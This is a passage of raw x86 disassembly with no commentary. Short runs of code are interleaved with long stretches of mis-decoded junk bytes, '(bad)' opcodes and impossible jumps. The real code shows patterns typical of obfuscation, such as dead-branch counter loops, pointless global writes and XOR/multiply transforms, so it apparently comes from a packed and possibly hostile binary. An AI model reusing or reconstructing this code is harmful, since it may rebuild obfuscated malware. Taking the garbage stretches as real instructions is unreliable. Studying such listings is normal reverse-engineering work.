  40831c:	xor    DWORD PTR ds:0x4337af,0x433843
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4337bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43377b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43371b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4337ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433773,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0x23a009e0
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x408363
  40838a:	pop    ds
  40838b:	fistp  QWORD PTR [ebx-0x77]
  40838e:	and    eax,0x8242f496
  408394:	mov    eax,0x417fcbe5
  408399:	leave  
  40839a:	inc    edi
  40839b:	sbb    edi,DWORD PTR [ecx]
  40839d:	lods   al,BYTE PTR ds:[esi]
  40839e:	fnsave [esi+ebx*4]
  4083a1:	xor    ebp,DWORD PTR [esi-0xdb9aee0]
  4083a7:	add    BYTE PTR [edx],0x53
  4083aa:	xchg   edx,eax
  4083ab:	jae    0x40834d
  4083ad:	push   ecx
  4083ae:	sub    DWORD PTR [esi-0x480cdd0a],ebp
  4083b4:	mov    ds:0xd854f7a2,al
  4083b9:	adc    ah,dh
  4083bb:	add    cl,BYTE PTR [ebp+0x4b59a30d]
  4083c1:	rcl    dl,1
  4083c3:	or     BYTE PTR [ebx-0x2e90138a],bh
  4083c9:	inc    ecx
  4083ca:	int    0xbb
  4083cc:	popa   
  4083cd:	sahf   
  4083ce:	sub    al,0x5e
  4083d0:	or     DWORD PTR [eax-0x41fc2ea0],0xab860490
  4083da:	or     BYTE PTR [esi+ecx*4],0x7b
  4083de:	mov    dh,0xc2
  4083e0:	sub    edi,ebp
  4083e2:	xchg   edi,eax
  4083e3:	das    
  4083e4:	sub    BYTE PTR [edx+0x2ac5393d],bh
  4083ea:	outs   dx,DWORD PTR ds:[esi]
  4083eb:	adc    BYTE PTR [esi-0x6a],bh
  4083ee:	inc    eax
  4083ef:	pop    es
  4083f0:	pusha  
  4083f1:	jno    0x4083b8
  4083f3:	xchg   ebp,eax
  4083f4:	xor    BYTE PTR [edi+0x4bfe6fe2],ah
  4083fa:	pop    es
  4083fb:	mov    al,0xb8
  4083fd:	ss out dx,al
  4083ff:	push   0x6
  408401:	aas    
  408402:	aam    0xf0
  408404:	mov    bl,0xcf
  408406:	cmp    al,0x65
  408408:	xor    BYTE PTR [edx-0x5f],ch
  40840b:	push   cs
  40840c:	scas   al,BYTE PTR es:[edi]
  40840d:	push   ss
  40840e:	dec    ecx
  40840f:	inc    esp
  408410:	mov    ds:0xd23c0e85,al
  408415:	mov    esi,0xed4be87
  40841a:	mov    ecx,0x6de9398a
  40841f:	jbe    0x4083bf
  408421:	xor    eax,0xe533d53b
  408426:	imul   eax,DWORD PTR [edi],0x3a
  408429:	jecxz  0x408473
  40842b:	mov    ah,0x37
  40842d:	mov    bl,0x7f
  40842f:	push   ebp
  408430:	push   eax
  408431:	ss inc esi
  408433:	out    dx,eax
  408434:	mov    gs,WORD PTR [ebp-0x794b5c27]
  40843a:	lds    eax,FWORD PTR [edi+ebp*1+0x330abbc2]
  408441:	icebp  
  408442:	aad    0x5a
  408444:	mov    ebx,0x20ab47ff
  408449:	in     eax,dx
  40844a:	js     0x408457
  40844c:	repz dec eax
  40844e:	inc    ecx
  40844f:	test   eax,0x742af7d1
  408454:	lods   eax,DWORD PTR ds:[esi]
  408455:	sti    
  408456:	mov    bl,0x67
  408458:	pusha  
  408459:	cmp    ebp,ebx
  40845b:	pop    ebx
  40845c:	sub    eax,0x80a59481
  408461:	dec    esp
  408462:	les    eax,FWORD PTR [edi+edi*8]
  408465:	add    ah,BYTE PTR [edi-0x52]
  408468:	sbb    esp,DWORD PTR ds:0xded9a8cf
  40846e:	aam    0xd6
  408470:	mov    ds:0x1fbd8434,eax
  408475:	push   0xe276fde3
  40847a:	clc    
  40847b:	out    dx,al
  40847c:	daa    
  40847d:	mov    eax,ds:0xfd948ebb
  408482:	fld    TBYTE PTR [edx+ebp*8]
  408485:	jp     0x408495
  408487:	mov    esp,0x213b8de7
  40848c:	pop    ebp
  40848d:	inc    edi
  40848e:	jmp    0x9695:0x43498596
  408495:	jbe    0x4084c6
  408497:	sbb    esp,esp
  408499:	mov    WORD PTR [edx+0xf],fs
  40849c:	adc    edi,DWORD PTR [edx]
  40849e:	mov    ch,bl
  4084a0:	push   cs
  4084a1:	add    dh,cl
  4084a3:	das    
  4084a4:	sbb    ebp,ebx
  4084a6:	test   al,0x66
  4084a8:	je     0x408458
  4084aa:	adc    ebp,edx
  4084ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084ad:	xchg   edi,eax
  4084ae:	xchg   edi,eax
  4084af:	ret    0xdd7a
  4084b2:	xor    esi,DWORD PTR [eax]
  4084b4:	mov    ch,0x71
  4084b6:	fistp  WORD PTR [esi+0x2b]
  4084b9:	stc    
  4084ba:	in     eax,0xd9
  4084bc:	mov    edi,0x2968ed1e
  4084c1:	push   ecx
  4084c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084c3:	test   BYTE PTR [edi],dh
  4084c5:	jmp    0x4084c5
  4084c7:	xor    ecx,DWORD PTR [edx+0x9bfcec8]
  4084cd:	xor    al,0x95
  4084cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084d0:	push   es
  4084d1:	or     al,0x76
  4084d3:	scas   eax,DWORD PTR es:[edi]
  4084d4:	test   al,0x9d
  4084d6:	and    al,0x5a
  4084d8:	retf   
  4084d9:	jp     0x408533
  4084db:	popf   
  4084dc:	cli    
  4084dd:	das    
  4084de:	cwde   
  4084df:	add    BYTE PTR [eax+edx*8],0x73
  4084e3:	lds    ebx,FWORD PTR [ecx-0x4c9f9d26]
  4084e9:	push   edi
  4084ea:	dec    esp
  4084eb:	jmp    0x93272fac
  4084f0:	push   edi
  4084f1:	ja     0x4084a3
  4084f3:	je     0x408e47
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43382f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43382f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43382f,edx
  408521:	cmp    DWORD PTR ds:0x43382f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43382f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433867
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433717,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433773
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4337bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4337bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4337bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4337bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4337bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	rcl    ah,cl
  4085df:	mov    dh,0x56
  4085e1:	in     al,dx
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	enter  0x70db,0x65
  4085ed:	sub    bl,BYTE PTR [ebx]
  4085ef:	cld    
  4085f0:	or     ch,BYTE PTR [ecx-0x5aa8958f]
  4085f6:	push   esi
  4085f7:	mov    esp,0x81de8481
  4085fc:	adc    esp,esp
  4085fe:	mov    ebx,?
  408600:	out    0x2,eax
  408602:	dec    edx
  408603:	push   ds
  408604:	sbb    edx,ebx
  408606:	push   eax
  408607:	and    al,0x8
  408609:	mov    ah,0xea
  40860b:	ss int3 
  40860d:	imul   esp,DWORD PTR [ebx-0x63],0xfffffff9
  408611:	inc    eax
  408612:	sbb    DWORD PTR ss:[eax-0x6bb9fbfa],0xc15f7d44
  40861d:	jg     0x408677
  40861f:	fmul   QWORD PTR [edi+eax*2+0x56434465]
  408626:	xor    cl,BYTE PTR [edi-0x4904c2c1]
  40862c:	mov    ds:0x2e90d767,al
  408631:	add    eax,0x58f02c5b
  408636:	pop    edi
  408637:	loop   0x4086ac
  408639:	sub    eax,0x54e4131d
  40863e:	enter  0xe8a7,0x2c
  408642:	call   0xeb82:0x6d063276
  408649:	jecxz  0x40864a
  40864b:	pop    esp
  40864c:	sub    DWORD PTR [esi-0x45a7b310],ebx
  408652:	or     al,0x5b
  408654:	mov    edx,0xe974d73f
  408659:	xchg   ebp,eax
  40865a:	in     eax,dx
  40865b:	fidivr WORD PTR [ebx]
  40865d:	sti    
  40865e:	out    dx,al
  40865f:	les    edi,FWORD PTR [eax+eiz*4+0x6]
  408663:	inc    ebp
  408664:	or     edi,DWORD PTR [esi-0x64]
  408667:	adc    bl,BYTE PTR [ebp+0x2c2d267b]
  40866d:	jbe    0x408691
  40866f:	push   edi
  408670:	and    BYTE PTR [ecx],0xfd
  408673:	pushf  
  408674:	ja     0x40868e
  408676:	inc    eax
  408677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408678:	sbb    DWORD PTR [edx-0x31],0xe9ef62ee
  40867f:	push   edx
  408680:	retf   
  408681:	cdq    
  408682:	es push eax
  408684:	xor    ebp,0x896e4c73
  40868a:	mov    edx,0x933d6a23
  40868f:	fimul  WORD PTR [esi+0x14e5d9d3]
  408695:	mov    edi,0x73a807ab
  40869a:	mov    ecx,DWORD PTR [edx]
  40869c:	adc    eax,0x21fc03ba
  4086a1:	js     0x408652
  4086a3:	sub    eax,0x6b7629
  4086a8:	aam    0xba
  4086aa:	cs out 0x17,eax
  4086ad:	imul   esp,esp,0xffffffe9
  4086b0:	push   edx
  4086b1:	cwde   
  4086b2:	mov    ebx,0x7b8c8afa
  4086b7:	inc    edi
  4086b8:	pop    es
  4086b9:	sub    ch,bl
  4086bb:	out    dx,eax
  4086bc:	arpl   WORD PTR [ecx-0x5d],si
  4086bf:	je     0x408657
  4086c1:	mov    esp,0xe8ee4f0
  4086c6:	adc    ebx,esi
  4086c8:	xor    al,0x79
  4086ca:	cmp    DWORD PTR [edx+0x8],0x54e1c99b
  4086d1:	xchg   BYTE PTR [edi-0x6baa686e],cl
  4086d7:	cmp    eax,0xc35921c3
  4086dc:	iret   
  4086dd:	outs   dx,BYTE PTR ds:[esi]
  4086de:	pop    eax
  4086df:	jg     0x408692
  4086e1:	mov    bl,0xe5
  4086e3:	jmp    0xcb7c:0x1516922b
  4086ea:	mov    esp,DWORD PTR [edi]
  4086ec:	mov    eax,0xc7e5993
  4086f1:	xor    eax,0x328cf2a7
  4086f6:	int    0x92
  4086f8:	jge    0x408725
  4086fa:	mov    esi,es
  4086fc:	add    BYTE PTR [esi],dh
  4086fe:	dec    ebx
  4086ff:	sub    al,0x6e
  408701:	push   0x9147bcff
  408706:	add    eax,0xeacfc116
  40870b:	(bad)  
  40870c:	out    dx,al
  40870d:	into   
  40870e:	mov    ch,0x5f
  408710:	dec    edx
  408711:	ret    0x2aa5
  408714:	(bad)  
  408716:	jl     0x40871e
  408718:	loop   0x408753
  40871a:	or     al,0xbe
  40871c:	mov    ebx,0xb3383cf0
  408721:	push   ds
  408722:	ficomp WORD PTR [ebp-0x462e6bc4]
  408728:	push   edx
  408729:	adc    edx,ebx
  40872b:	jae    0x408701
  40872d:	pop    ebx
  40872e:	pop    esp
  40872f:	fs dec ebp
  408731:	adc    ah,BYTE PTR [ebx]
  408733:	repz out dx,al
  408735:	sub    cl,BYTE PTR [esi+0x6c2f969b]
  40873b:	out    0xff,eax
  40873d:	sbb    DWORD PTR [ebx+0x77],ebx
  408740:	push   ecx
  408741:	ret    0xd387
  408744:	push   ss
  408745:	dec    ebx
  408746:	jo     0x40874b
  408748:	cmp    BYTE PTR [edx+edi*1],ah
  40874b:	enter  0xbc0a,0x3a
  40874f:	and    eax,0x8b5ad32f
  408754:	inc    ebp
  408755:	clc    
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     ch,dh
  40876c:	push   esp
  40876d:	pop    eax
  40876e:	dec    esp
  40876f:	push   edx
  408770:	sar    DWORD PTR [esi+0x7e],cl
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	pop    ebp
  408778:	aas    
  408779:	repnz out 0x2a,eax
  40877c:	add    DWORD PTR [ecx+0x793dad69],esp
  408782:	fadd   DWORD PTR [edi]
  408784:	pop    es
  408785:	sahf   
  408786:	cmp    ebx,DWORD PTR [edx-0x6eaf9970]
  40878c:	retf   
  40878d:	xchg   edi,eax
  40878e:	and    dl,bh
  408790:	daa    
  408791:	push   esi
  408792:	pop    edx
  408793:	and    bl,BYTE PTR [edx]
  408795:	je     0x408808
  408797:	idiv   DWORD PTR [edi+0x7fc8d819]
  40879d:	aaa    
  40879e:	ds retf 0xc01e
  4087a2:	gs mov edi,0x2c435b1c
  4087a8:	test   eax,0x4bd0b5f8
  4087ad:	adc    cl,dh
  4087af:	xor    al,0xe0
  4087b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087b2:	mov    ch,0x7f
  4087b4:	(bad)  
  4087b5:	mov    ss,WORD PTR [edi-0x78]
  4087b8:	xor    ah,BYTE PTR [edi+0x7d94516f]
  4087be:	inc    edi
  4087bf:	loop   0x4087bb
  4087c1:	xchg   edi,eax
  4087c2:	adc    al,BYTE PTR [edi-0x15844abb]
  4087c8:	jmp    0x8b27ede4
  4087cd:	dec    edx
  4087ce:	arpl   WORD PTR [ebp+esi*1-0x37],ax
  4087d2:	fsub   QWORD PTR [edi]
  4087d4:	and    DWORD PTR [ebp+0x55],edi
  4087d7:	or     ecx,DWORD PTR [eax]
  4087d9:	sti    
  4087da:	std    
  4087db:	jo     0x4087ed
  4087dd:	in     eax,0x47
  4087df:	aaa    
  4087e0:	imul   esi,DWORD PTR [esp+esi*2],0xa29bbcf0
  4087e7:	cwde   
  4087e8:	mov    esi,0x7eec55de
  4087ed:	dec    edx
  4087ee:	dec    ebp
  4087ef:	sti    
  4087f0:	pop    eax
  4087f1:	in     eax,dx
  4087f2:	jg     0x4087f9
  4087f4:	loopne 0x40880d
  4087f6:	lfs    esp,FWORD PTR [edx-0x66]
  4087fa:	bound  esp,QWORD PTR [edi]
  4087fc:	loope  0x4087e6
  4087fe:	rol    esi,cl
  408800:	fnstenv [ebx]
  408802:	fwait
  408803:	ret    0x4b7c
  408806:	jp     0x4087d2
  408808:	mov    al,ds:0x67cb23cf
  40880d:	retf   0xb425
  408810:	xor    edi,0x69
  408813:	(bad)  
  408814:	fcomp  QWORD PTR [edx-0x3f]
  408817:	clc    
  408818:	and    al,0xb3
  40881a:	popa   
  40881b:	mov    ebp,0x282ac5a9
  408820:	outs   dx,DWORD PTR ds:[esi]
  408821:	(bad)  
  408823:	pop    esi
  408824:	pop    eax
  408825:	and    eax,0x66e278ae
  40882a:	mov    esp,0x3f290057
  40882f:	shl    BYTE PTR [ecx],1
  408831:	int3   
  408832:	and    dl,bh
  408834:	cmp    esp,DWORD PTR [edi+0x49]
  408837:	xchg   edi,eax
  408838:	rcl    BYTE PTR [esi-0x2a],cl
  40883b:	fimul  DWORD PTR [edx+0x2590ffcd]
  408841:	retf   0x5709
  408844:	add    eax,ebx
  408846:	and    cl,bl
  408848:	add    eax,0xc8e78c61
  40884d:	pop    eax
  40884e:	jbe    0x4087f9
  408850:	push   esi
  408851:	in     al,dx
  408852:	std    
  408853:	das    
  408854:	arpl   bp,si
  408856:	xchg   edx,eax
  408857:	inc    edi
  408858:	or     esp,DWORD PTR [edi]
  40885a:	ror    BYTE PTR [edx+edx*8],cl
  40885d:	adc    BYTE PTR [eax],dl
  40885f:	test   dl,ch
  408861:	push   ebp
  408862:	int    0x3b
  408864:	jmp    0x432f:0x33aa2c5d
  40886b:	push   0x722f0937
  408870:	or     al,0x90
  408872:	or     bl,BYTE PTR [ebx+0x1c]
  408875:	inc    esp
  408876:	cmp    BYTE PTR [ebp-0x7d],bh
  408879:	mov    ecx,0x743418d8
  40887e:	scas   eax,DWORD PTR es:[edi]
  40887f:	(bad)  
  408880:	sbb    eax,0xef2c8f55
  408885:	mov    edx,esi
  408887:	test   al,0xa0
  408889:	jge    0x408900
  40888b:	xor    BYTE PTR [edi],al
  40888d:	repnz and al,0x27
  408890:	xchg   edi,eax
  408891:	add    ecx,0x9bcd2279
  408897:	imul   eax,DWORD PTR [eax],0x44c727f1
  40889d:	mov    eax,ds:0xb85de1a5
  4088a2:	xchg   esp,eax
  4088a3:	xor    eax,0xaa656657
  4088a8:	push   esp
  4088a9:	mov    ah,0x9c
  4088ab:	mov    esi,0x84adcb44
  4088b0:	sub    DWORD PTR ds:0x84e4630c,ebx
  4088b6:	jp     0x408859
  4088b8:	xchg   ebp,eax
  4088b9:	fadd   QWORD PTR [eax+0x1f4b7233]
  4088bf:	cs cmp BYTE PTR ss:0x8572c72a,dl
  4088c7:	dec    esi
  4088c8:	adc    BYTE PTR [eax+0x2d518679],0x44
  4088cf:	out    dx,al
  4088d0:	push   ss
  4088d1:	fsub   DWORD PTR [eax+0x7d6f3142]
  4088d7:	popf   
  4088d8:	cmp    DWORD PTR [edi],edx
  4088da:	mov    BYTE PTR [ecx-0x455f1d44],bl
  4088e0:	jae    0x408941
  4088e2:	pop    esi
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0x7390681a
  40893f:	sti    
  408940:	aas    
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	jbe    0x408912
  40894b:	mov    ss,WORD PTR [eax+0x22]
  40894e:	sbb    DWORD PTR [esi+0x3c],ebp
  408951:	es push ebx
  408953:	je     0x408977
  408955:	inc    ebp
  408956:	shl    BYTE PTR [eax-0x62b92d5f],cl
  40895c:	add    eax,DWORD PTR [eax]
  40895e:	pop    ds
  40895f:	jnp    0x4089b5
  408961:	adc    ecx,DWORD PTR [eax]
  408963:	pop    esp
  408964:	mov    esi,0x9c818ae4
  408969:	nop
  40896a:	inc    edi
  40896b:	ret    
  40896c:	jp     0x4089a0
  40896e:	rep stos DWORD PTR es:[edi],eax
  408970:	test   BYTE PTR ds:0xcf83906f,bh
  408976:	jle    0x408981
  408978:	mov    eax,0x69024649
  40897d:	adc    al,0xff
  40897f:	rol    BYTE PTR [ecx],1
  408981:	and    BYTE PTR [esi-0x73],dh
  408984:	and    eax,0xaf04029c
  408989:	or     dl,BYTE PTR [eax-0x2524a04a]
  40898f:	xchg   ecx,eax
  408990:	inc    esi
  408991:	iret   
  408992:	(bad)  
  408993:	call   DWORD PTR [edx+0x4edee6f4]
  408999:	ror    BYTE PTR [esp+ecx*8],1
  40899c:	or     DWORD PTR [ecx],esi
  40899e:	inc    ecx
  40899f:	into   
  4089a0:	or     DWORD PTR [eax-0x56505f72],edx
  4089a6:	adc    DWORD PTR ds:0x368ceb82,ebx
  4089ac:	aam    0x8
  4089ae:	push   ebp
  4089af:	jb     0x40894d
  4089b1:	mov    BYTE PTR [edx-0x5e8f285f],0x67
  4089b8:	cmp    al,0xb6
  4089ba:	mov    dh,0x51
  4089bc:	add    DWORD PTR [eax],eax
  4089be:	rol    eax,1
  4089c0:	lods   eax,DWORD PTR ds:[esi]
  4089c1:	add    BYTE PTR [esi+ebp*1-0xe],0x84
  4089c6:	adc    BYTE PTR [esi+0x35],ah
  4089c9:	xor    ebp,edi
  4089cb:	dec    eax
  4089cc:	sub    ebp,ebp
  4089ce:	test   eax,0xc86698bb
  4089d3:	push   edx
  4089d4:	and    DWORD PTR [esi],edi
  4089d6:	scas   al,BYTE PTR es:[edi]
  4089d7:	test   eax,0x27e5812f
  4089dc:	or     BYTE PTR [ecx-0x2ff61f5c],dl
  4089e2:	into   
  4089e3:	mov    ebp,0x40316226
  4089e8:	(bad)  
  4089e9:	sar    BYTE PTR ds:[ecx],cl
  4089ec:	push   eax
  4089ed:	call   0xb747:0x3a7b2218
  4089f4:	popa   
  4089f5:	push   0xfa46662b
  4089fa:	pop    esi
  4089fb:	xor    dh,BYTE PTR [esi]
  4089fd:	cmp    eax,0xba85249a
  408a02:	mov    edx,0x4eb4cae9
  408a07:	xchg   DWORD PTR [ebp+eax*1+0x5dba5610],ecx
  408a0e:	loope  0x408a25
  408a10:	push   ebp
  408a11:	popa   
  408a12:	aam    0x81
  408a14:	sub    al,0xb9
  408a16:	ins    BYTE PTR es:[edi],dx
  408a17:	sbb    al,0xcd
  408a19:	jl     0x408a96
  408a1b:	pop    edx
  408a1c:	and    esp,0xca3d2c8
  408a22:	ins    BYTE PTR es:[edi],dx
  408a23:	and    esi,DWORD PTR cs:[esp+esi*2]
  408a27:	in     eax,0xac
  408a29:	and    al,0x32
  408a2b:	es xchg eax,edx
  408a2e:	cmc    
  408a2f:	(bad)  
  408a30:	imul   ebx,DWORD PTR [ecx+ebx*8+0xedbfe59],0xfea12a54
  408a3b:	outs   dx,BYTE PTR ds:[esi]
  408a3c:	popf   
  408a3d:	adc    bl,BYTE PTR [edx-0x1e59e861]
  408a43:	repz pop ebx
  408a45:	add    eax,0x1c16144a
  408a4a:	pop    eax
  408a4b:	sahf   
  408a4c:	mov    ds:0x6e664ec9,al
  408a51:	push   cs
  408a52:	icebp  
  408a53:	mul    BYTE PTR [edx-0x167d4d92]
  408a59:	call   0xad12:0x3f3fa60a
  408a60:	mov    ebx,0x3cfadd78
  408a65:	sbb    DWORD PTR [ebx],edi
  408a67:	stos   BYTE PTR es:[edi],al
  408a68:	shr    BYTE PTR [ebp-0x33],1
  408a6b:	ja     0x408a5e
  408a6d:	clc    
  408a6e:	mov    ah,0x68
  408a70:	xor    bh,BYTE PTR [esi+0x21541e16]
  408a76:	fsubr  DWORD PTR [ebx+0x440b331]
  408a7c:	add    DWORD PTR [ebp+0xf],esp
  408a7f:	mov    esp,0x70916505
  408a84:	mov    bh,0x93
  408a86:	xchg   BYTE PTR [ecx],bh
  408a88:	fdiv   QWORD PTR [eax+0x29]
  408a8b:	out    0x57,al
  408a8d:	cmp    DWORD PTR [ebx+0x6f78b40d],esp
  408a93:	jecxz  0x408af4
  408a95:	ret    
  408a96:	sub    eax,0xa5982fd7
  408a9b:	test   BYTE PTR [edx],ah
  408a9d:	cmp    al,0x69
  408a9f:	or     esi,DWORD PTR [esi+0x4bb4fed2]
  408aa5:	js     0x408ad5
  408aa7:	les    esp,FWORD PTR [ecx]
  408aa9:	in     al,0xd0
  408aab:	jae    0x408ac4
  408aad:	adc    ebx,eax
  408aaf:	(bad)  
  408ab0:	adc    ch,dl
  408ab2:	xchg   BYTE PTR [ebx+0x3f8b087d],cl
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	and    al,0xc0
  408b1c:	call   0xe47e:0x7edeae77
  408b23:	jg     0x408ba3
  408b25:	jle    0x408b30
  408b27:	push   0x812934a2
  408b2c:	out    0xc6,eax
  408b2e:	js     0x408b35
  408b30:	sub    al,0xae
  408b32:	dec    esi
  408b33:	aad    0x7
  408b35:	fwait
  408b36:	xchg   esi,eax
  408b37:	test   DWORD PTR [ecx-0x2fdda0a6],ecx
  408b3d:	adc    DWORD PTR [ecx-0x62],ebx
  408b40:	dec    edx
  408b41:	add    dl,0x64
  408b44:	ins    DWORD PTR es:[edi],dx
  408b45:	inc    esp
  408b46:	and    esi,DWORD PTR [edi]
  408b48:	jns    0x408af9
  408b4a:	mov    edi,0x474136a
  408b4f:	xor    BYTE PTR [esi],ch
  408b51:	sbb    DWORD PTR [ebp+0x7e],0xbaaae095
  408b58:	xchg   edi,eax
  408b59:	cmp    eax,0x4b0fcbea
  408b5e:	xor    eax,0x306ad556
  408b63:	sbb    esp,eax
  408b65:	fs std 
  408b67:	je     0x408bd6
  408b69:	dec    edi
  408b6a:	cwde   
  408b6b:	push   ecx
  408b6c:	out    0xd5,eax
  408b6e:	repz push ss
  408b70:	stos   BYTE PTR es:[edi],al
  408b71:	and    eax,0x5ed1280f
  408b76:	shr    BYTE PTR [ebx-0x13],cl
  408b79:	push   0xffffffaf
  408b7b:	js     0x408bbf
  408b7d:	fs mov ah,0x41
  408b80:	mov    ebx,0xf6ac1059
  408b85:	lds    ebp,FWORD PTR [edx-0x5b0db81d]
  408b8b:	data16 sbb BYTE PTR [ebx+0x7d],ch
  408b8f:	ret    0xd89f
  408b92:	jno    0x408b38
  408b94:	lahf   
  408b95:	cmp    al,0x3a
  408b97:	rcr    DWORD PTR [ebp-0x4408f4d0],1
  408b9d:	xor    DWORD PTR [eax+0x66ea72f3],eax
  408ba3:	adc    al,0xfb
  408ba5:	adc    al,0xcc
  408ba7:	test   ch,dl
  408ba9:	into   
  408baa:	xchg   bl,cl
  408bac:	rol    esp,cl
  408bae:	push   ebx
  408baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bb0:	sahf   
  408bb1:	cmc    
  408bb2:	out    dx,eax
  408bb3:	xchg   edx,eax
  408bb4:	fild   WORD PTR [ecx+0x10]
  408bb7:	es push ebx
  408bb9:	sahf   
  408bba:	stos   BYTE PTR es:[edi],al
  408bbb:	add    DWORD PTR [esi+0xb0a9b9a],eax
  408bc1:	aas    
  408bc2:	pop    ecx
  408bc3:	xor    BYTE PTR [eax],bl
  408bc5:	mov    eax,ds:0xfb83e7cb
  408bca:	sbb    BYTE PTR [ecx-0x7f],al
  408bcd:	sti    
  408bce:	and    eax,0xe00bebfb
  408bd3:	mov    DWORD PTR [edi],ecx
  408bd5:	push   0x15669e8c
  408bda:	fbld   TBYTE PTR [ebx+0x1a62d9c0]
  408be0:	adc    bh,BYTE PTR ds:0xf14faa6e
  408be6:	ins    DWORD PTR es:[edi],dx
  408be7:	mov    ebx,0xb0655c4e
  408bec:	shl    esi,1
  408bee:	test   BYTE PTR [ebx],0xb7
  408bf1:	fsub   QWORD PTR [edi]
  408bf3:	stos   BYTE PTR es:[edi],al
  408bf4:	cmp    bl,BYTE PTR [eax-0x19]
